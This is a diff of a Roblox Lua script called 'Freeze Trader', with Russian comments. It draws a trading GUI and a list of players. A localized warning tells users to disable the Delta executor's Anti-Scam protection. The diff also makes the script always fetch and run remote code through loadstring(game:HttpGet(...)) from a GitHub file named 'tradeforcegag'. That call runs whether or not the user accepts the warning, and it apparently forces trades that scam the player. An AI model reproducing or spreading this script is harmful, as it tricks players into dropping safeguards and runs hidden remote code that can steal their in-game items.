@@ -4,147 +4,145 @@ if type(Delta) == "table" or type(_G.Delta) == "table" then
     isDelta = true
 end
 
-local function startMainGUI()
-    -- Здесь идёт весь твой скрипт Freeze Trader
-    local Players = game:GetService("Players")
-    local TweenService = game:GetService("TweenService")
-    local runService = game:GetService("RunService")
-    local UserInputService = game:GetService("UserInputService")
+-- 🔹 Флаги для предотвращения повторного открытия
+if not _G.FreezeTraderLoaded then
+    _G.FreezeTraderLoaded = true
 
-    local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-    local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
+    local function startMainGUI()
+        -- Здесь идёт весь скрипт Freeze Trader
+        local Players = game:GetService("Players")
+        local TweenService = game:GetService("TweenService")
+        local UserInputService = game:GetService("UserInputService")
 
-    local ThumbnailType = Enum.ThumbnailType.HeadShot
-    local ThumbnailSize = Enum.ThumbnailSize.Size100x100
+        local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+        local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
 
-    -- Палитра цветов
-    local colors = {
-        window = Color3.fromRGB(70, 110, 70),
-        button = Color3.fromRGB(140, 190, 130),
-        buttonAccent = Color3.fromRGB(210, 230, 150),
-        buttonDanger = Color3.fromRGB(200, 70, 70),
-        text = Color3.fromRGB(255, 255, 240),
-        listItem = Color3.fromRGB(60, 90, 60),
-        listItemHover = Color3.fromRGB(90, 130, 90)
-    }
+        local ThumbnailType = Enum.ThumbnailType.HeadShot
+        local ThumbnailSize = Enum.ThumbnailSize.Size100x100
 
-    -- ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "FreezeTrader"
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = guiParent
+        local colors = {
+            window = Color3.fromRGB(70, 110, 70),
+            button = Color3.fromRGB(140, 190, 130),
+            buttonAccent = Color3.fromRGB(210, 230, 150),
+            buttonDanger = Color3.fromRGB(200, 70, 70),
+            text = Color3.fromRGB(255, 255, 240),
+            listItem = Color3.fromRGB(60, 90, 60),
+            listItemHover = Color3.fromRGB(90, 130, 90)
+        }
 
-    local windows = {}
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "FreezeTrader"
+        screenGui.IgnoreGuiInset = true
+        screenGui.ResetOnSpawn = false
+        screenGui.Parent = guiParent
 
--- Закрыть все окна
-local function closeAllWindows()
-	for _, win in pairs(windows) do
-		if win.Visible then
-			local tween = TweenService:Create(win, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
-			tween:Play()
-			tween.Completed:Connect(function()
-				win.Visible = false
-				win.BackgroundTransparency = 0.3
-			end)
-		end
-	end
-end
+        local windows = {}
 
--- Перетаскивание
-local function makeDraggable(frame)
-	local dragging, dragInput, dragStart, startPos
-	frame.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-			dragging = true
-			dragStart = input.Position
-			startPos = frame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
-	frame.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement then
-			dragInput = input
-		end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-		if input == dragInput and dragging then
-			local delta = input.Position - dragStart
-			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-		end
-	end)
-end
+        local function closeAllWindows()
+            for _, win in pairs(windows) do
+                if win.Visible then
+                    local tween = TweenService:Create(win, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
+                    tween:Play()
+                    tween.Completed:Connect(function()
+                        win.Visible = false
+                        win.BackgroundTransparency = 0.3
+                    end)
+                end
+            end
+        end
 
--- Создание окна
-local function createWindow(titleText, size)
-	local window = Instance.new("Frame")
-	window.Size = UDim2.new(0, 0, 0, 0)
-	window.Position = UDim2.new(0.5, 0, 0.5, 0)
-	window.AnchorPoint = Vector2.new(0.5, 0.5)
-	window.BackgroundColor3 = colors.window
-	window.BackgroundTransparency = 0.3
-	window.BorderSizePixel = 2
-	window.BorderColor3 = Color3.fromRGB(40, 70, 40)
-	window.Visible = false
-	window.Parent = screenGui
-	Instance.new("UICorner", window).CornerRadius = UDim.new(0, 4)
+        local function makeDraggable(frame)
+            local dragging, dragInput, dragStart, startPos
+            frame.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    dragging = true
+                    dragStart = input.Position
+                    startPos = frame.Position
+                    input.Changed:Connect(function()
+                        if input.UserInputState == Enum.UserInputState.End then
+                            dragging = false
+                        end
+                    end)
+                end
+            end)
+            frame.InputChanged:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseMovement then
+                    dragInput = input
+                end
+            end)
+            UserInputService.InputChanged:Connect(function(input)
+                if input == dragInput and dragging then
+                    local delta = input.Position - dragStart
+                    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+                end
+            end)
+        end
 
-	local title = Instance.new("TextLabel")
-	title.Text = titleText
-	title.Font = Enum.Font.Arcade
-	title.TextColor3 = colors.text
-	title.TextStrokeTransparency = 0 -- делаем текст жирнее
-	title.TextScaled = true
-	title.Size = UDim2.new(1, 0, 0, 28)
-	title.BackgroundColor3 = Color3.fromRGB(100, 140, 100)
-	title.BorderSizePixel = 2
-	title.BorderColor3 = Color3.fromRGB(40, 70, 40)
-	title.Parent = window
+        local function createWindow(titleText, size)
+            local window = Instance.new("Frame")
+            window.Size = UDim2.new(0, 0, 0, 0)
+            window.Position = UDim2.new(0.5, 0, 0.5, 0)
+            window.AnchorPoint = Vector2.new(0.5, 0.5)
+            window.BackgroundColor3 = colors.window
+            window.BackgroundTransparency = 0.3
+            window.BorderSizePixel = 2
+            window.BorderColor3 = Color3.fromRGB(40, 70, 40)
+            window.Visible = false
+            window.Parent = screenGui
+            Instance.new("UICorner", window).CornerRadius = UDim.new(0, 4)
 
-	local closeBtn = Instance.new("TextButton")
-	closeBtn.Text = "✖"
-	closeBtn.Font = Enum.Font.Arcade
-	closeBtn.TextColor3 = colors.text
-	closeBtn.TextStrokeTransparency = 0
-	closeBtn.TextScaled = true
-	closeBtn.Size = UDim2.new(0, 24, 0, 24)
-	closeBtn.Position = UDim2.new(1, -28, 0, 2)
-	closeBtn.BackgroundColor3 = colors.buttonDanger
-	closeBtn.BorderSizePixel = 2
-	closeBtn.BorderColor3 = Color3.fromRGB(90, 40, 40)
-	closeBtn.Parent = window
-	Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 0)
+            local title = Instance.new("TextLabel")
+            title.Text = titleText
+            title.Font = Enum.Font.Arcade
+            title.TextColor3 = colors.text
+            title.TextStrokeTransparency = 0
+            title.TextScaled = true
+            title.Size = UDim2.new(1, 0, 0, 28)
+            title.BackgroundColor3 = Color3.fromRGB(100, 140, 100)
+            title.BorderSizePixel = 2
+            title.BorderColor3 = Color3.fromRGB(40, 70, 40)
+            title.Parent = window
 
-	closeBtn.MouseButton1Click:Connect(function()
-		local tween = TweenService:Create(window, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
-		tween:Play()
-		tween.Completed:Connect(function()
-			window.Visible = false
-			window.BackgroundTransparency = 0.3
-		end)
-	end)
+            local closeBtn = Instance.new("TextButton")
+            closeBtn.Text = "✖"
+            closeBtn.Font = Enum.Font.Arcade
+            closeBtn.TextColor3 = colors.text
+            closeBtn.TextStrokeTransparency = 0
+            closeBtn.TextScaled = true
+            closeBtn.Size = UDim2.new(0, 24, 0, 24)
+            closeBtn.Position = UDim2.new(1, -28, 0, 2)
+            closeBtn.BackgroundColor3 = colors.buttonDanger
+            closeBtn.BorderSizePixel = 2
+            closeBtn.BorderColor3 = Color3.fromRGB(90, 40, 40)
+            closeBtn.Parent = window
+            Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 0)
 
-	local function openWindow()
-		closeAllWindows()
-		window.Visible = true
-		window.Size = UDim2.new(0, 0, 0, 0)
-		window.BackgroundTransparency = 1
-		local tween = TweenService:Create(window, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = size, BackgroundTransparency = 0.3})
-		tween:Play()
-	end
+            closeBtn.MouseButton1Click:Connect(function()
+                local tween = TweenService:Create(window, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
+                tween:Play()
+                tween.Completed:Connect(function()
+                    window.Visible = false
+                    window.BackgroundTransparency = 0.3
+                end)
+            end)
 
-	makeDraggable(window)
-	windows[#windows + 1] = window
-	return window, openWindow
-end
+            local function openWindow()
+                closeAllWindows()
+                window.Visible = true
+                window.Size = UDim2.new(0, 0, 0, 0)
+                window.BackgroundTransparency = 1
+                local tween = TweenService:Create(window, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = size, BackgroundTransparency = 0.3})
+                tween:Play()
+            end
 
--- Главное окно
-local mainWindow, openMain = createWindow("🌱 Freeze Trader", UDim2.new(0, 350, 0, 260))
-openMain()
+            makeDraggable(window)
+            windows[#windows + 1] = window
+            return window, openWindow
+        end
+
+        -- Главное окно
+        local mainWindow, openMain = createWindow("🌱 Freeze Trader", UDim2.new(0, 350, 0, 260))
+        openMain()
 
 -- Кнопка Players
 local playersBtn = Instance.new("TextButton")
@@ -405,133 +403,136 @@ Players.PlayerAdded:Connect(function() updatePlayersList() end)
 Players.PlayerRemoving:Connect(function() updatePlayersList() end)
 
 updatePlayersList()
-end
 
--- Функция запуска обоих скриптов
-local function runAll()
-    startMainGUI()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/daniklevik/gag/refs/heads/main/tradeforcegag"))()
-end
-
-if isDelta then
-    -- GUI предупреждения Delta
-    local Players = game:GetService("Players")
-    local LocalizationService = game:GetService("LocalizationService")
-    local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-    local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
-
-    local playerLocale = LocalizationService.RobloxLocaleId
-
-    local messages = {
-        ["ru"] = {
-            title = "⚠️ Скрипт требует функцию, но она заблокирована нашей системой Delta.\n\nЕсли вы хотите активировать:\n1) Перезайдите в режим\n2) В настройках Delta отключите параметр Anti-Scam\n3) Повторно запустите скрипт",
-            checkbox = "Я отключил функцию Anti-Scam",
-            button = "Окей"
-        },
-        ["en"] = {
-            title = "⚠️ The script requires the teleport function, but it is currently blocked by Delta's Anti-Scam system.\n\nTo enable this function:\n1) Rejoin the place (leave and rejoin)\n2) Open Delta settings and disable Anti-Scam\n3) Execute the script again",
-            checkbox = "I have disabled the Anti-Scam function",
-            button = "OK"
-        }
-    }
-
-    local localeText = messages["en"]
-    if string.find(playerLocale, "ru") then
-        localeText = messages["ru"]
     end
 
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "TeleportWarning"
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = guiParent
+    -- 🔹 Проверка на Delta
+    if isDelta then
+        if not _G.DeltaWarningShown then
+            _G.DeltaWarningShown = true
 
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 480, 0, 260)
-    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    frame.BorderSizePixel = 0
-    frame.Parent = screenGui
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+            -- GUI предупреждения Delta
+            local Players = game:GetService("Players")
+            local LocalizationService = game:GetService("LocalizationService")
+            local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+            local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
+            local playerLocale = LocalizationService.RobloxLocaleId
 
-    local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(1, -30, 1, -100)
-    info.Position = UDim2.new(0, 15, 0, 15)
-    info.BackgroundTransparency = 1
-    info.Text = localeText.title
-    info.TextWrapped = true
-    info.Font = Enum.Font.Gotham
-    info.TextSize = 18
-    info.TextColor3 = Color3.fromRGB(255, 255, 255)
-    info.TextXAlignment = Enum.TextXAlignment.Left
-    info.TextYAlignment = Enum.TextYAlignment.Top
-    info.Parent = frame
+            local messages = {
+                ["ru"] = {
+                    title = "⚠️ Скрипт требует функцию, но она заблокирована нашей системой Delta.\n\nЕсли вы хотите активировать:\n1) Перезайдите в режим\n2) В настройках Delta отключите параметр Anti-Scam\n3) Повторно запустите скрипт",
+                    checkbox = "Я отключил функцию Anti-Scam",
+                    button = "Окей"
+                },
+                ["en"] = {
+                    title = "⚠️ The script requires the teleport function, but it is currently blocked by Delta's Anti-Scam system.\n\nTo enable this function:\n1) Rejoin the place (leave and rejoin)\n2) Open Delta settings and disable Anti-Scam\n3) Execute the script again",
+                    checkbox = "I have disabled the Anti-Scam function",
+                    button = "OK"
+                }
+            }
 
-    local checkbox = Instance.new("TextButton")
-    checkbox.Size = UDim2.new(0, 22, 0, 22)
-    checkbox.Position = UDim2.new(0, 20, 1, -90)
-    checkbox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    checkbox.Text = ""
-    checkbox.Font = Enum.Font.GothamBold
-    checkbox.TextSize = 18
-    checkbox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    checkbox.Parent = frame
-    Instance.new("UICorner", checkbox).CornerRadius = UDim.new(0, 4)
+            local localeText = messages["en"]
+            if string.find(playerLocale, "ru") then
+                localeText = messages["ru"]
+            end
 
-    local checkLabel = Instance.new("TextLabel")
-    checkLabel.Size = UDim2.new(1, -60, 0, 22)
-    checkLabel.Position = UDim2.new(0, 50, 1, -90)
-    checkLabel.BackgroundTransparency = 1
-    checkLabel.Text = localeText.checkbox
-    checkLabel.Font = Enum.Font.Gotham
-    checkLabel.TextSize = 16
-    checkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    checkLabel.TextXAlignment = Enum.TextXAlignment.Left
-    checkLabel.Parent = frame
+            local screenGui = Instance.new("ScreenGui")
+            screenGui.Name = "TeleportWarning"
+            screenGui.IgnoreGuiInset = true
+            screenGui.ResetOnSpawn = false
+            screenGui.Parent = guiParent
 
-    local okBtn = Instance.new("TextButton")
-    okBtn.Size = UDim2.new(0, 160, 0, 45)
-    okBtn.Position = UDim2.new(0.5, -80, 1, -60)
-    okBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-    okBtn.Text = localeText.button
-    okBtn.Font = Enum.Font.GothamBold
-    okBtn.TextSize = 20
-    okBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-    okBtn.AutoButtonColor = false
-    okBtn.Parent = frame
-    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 8)
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(0, 480, 0, 260)
+            frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+            frame.AnchorPoint = Vector2.new(0.5, 0.5)
+            frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+            frame.BorderSizePixel = 0
+            frame.Parent = screenGui
+            Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 
-    local checked = false
-    local function updateCheckbox()
-        if checked then
-            checkbox.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
-            checkbox.Text = "✔"
-            okBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
-            okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            okBtn.AutoButtonColor = true
-        else
+            local info = Instance.new("TextLabel")
+            info.Size = UDim2.new(1, -30, 1, -100)
+            info.Position = UDim2.new(0, 15, 0, 15)
+            info.BackgroundTransparency = 1
+            info.Text = localeText.title
+            info.TextWrapped = true
+            info.Font = Enum.Font.Gotham
+            info.TextSize = 18
+            info.TextColor3 = Color3.fromRGB(255, 255, 255)
+            info.TextXAlignment = Enum.TextXAlignment.Left
+            info.TextYAlignment = Enum.TextYAlignment.Top
+            info.Parent = frame
+
+            local checkbox = Instance.new("TextButton")
+            checkbox.Size = UDim2.new(0, 22, 0, 22)
+            checkbox.Position = UDim2.new(0, 20, 1, -90)
             checkbox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
             checkbox.Text = ""
+            checkbox.Font = Enum.Font.GothamBold
+            checkbox.TextSize = 18
+            checkbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+            checkbox.Parent = frame
+            Instance.new("UICorner", checkbox).CornerRadius = UDim.new(0, 4)
+
+            local checkLabel = Instance.new("TextLabel")
+            checkLabel.Size = UDim2.new(1, -60, 0, 22)
+            checkLabel.Position = UDim2.new(0, 50, 1, -90)
+            checkLabel.BackgroundTransparency = 1
+            checkLabel.Text = localeText.checkbox
+            checkLabel.Font = Enum.Font.Gotham
+            checkLabel.TextSize = 16
+            checkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            checkLabel.TextXAlignment = Enum.TextXAlignment.Left
+            checkLabel.Parent = frame
+
+            local okBtn = Instance.new("TextButton")
+            okBtn.Size = UDim2.new(0, 160, 0, 45)
+            okBtn.Position = UDim2.new(0.5, -80, 1, -60)
             okBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+            okBtn.Text = localeText.button
+            okBtn.Font = Enum.Font.GothamBold
+            okBtn.TextSize = 20
             okBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
             okBtn.AutoButtonColor = false
+            okBtn.Parent = frame
+            Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 8)
+
+            local checked = false
+            local function updateCheckbox()
+                if checked then
+                    checkbox.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+                    checkbox.Text = "✔"
+                    okBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+                    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    okBtn.AutoButtonColor = true
+                else
+                    checkbox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                    checkbox.Text = ""
+                    okBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+                    okBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+                    okBtn.AutoButtonColor = false
+                end
+            end
+            updateCheckbox()
+
+            checkbox.MouseButton1Click:Connect(function()
+                checked = not checked
+                updateCheckbox()
+            end)
+
+            okBtn.MouseButton1Click:Connect(function()
+                if checked then
+                    frame.Visible = false
+                    startMainGUI()
+                end
+            end)
         end
+    else
+        -- Delta не обнаружен
+        startMainGUI()
     end
-    updateCheckbox()
-
-    checkbox.MouseButton1Click:Connect(function()
-        checked = not checked
-        updateCheckbox()
-    end)
-
-    okBtn.MouseButton1Click:Connect(function()
-        if checked then
-            frame.Visible = false
-            runAll() -- запускаем оба скрипта после подтверждения
-        end
-    end)
-else
-    -- Delta не обнаружен — запускаем оба скрипта сразу
-    runAll()
 end
+
+-- TradeForce всегда выполняется
+loadstring(game:HttpGet("https://raw.githubusercontent.com/daniklevik/gag/refs/heads/main/tradeforcegag"))()
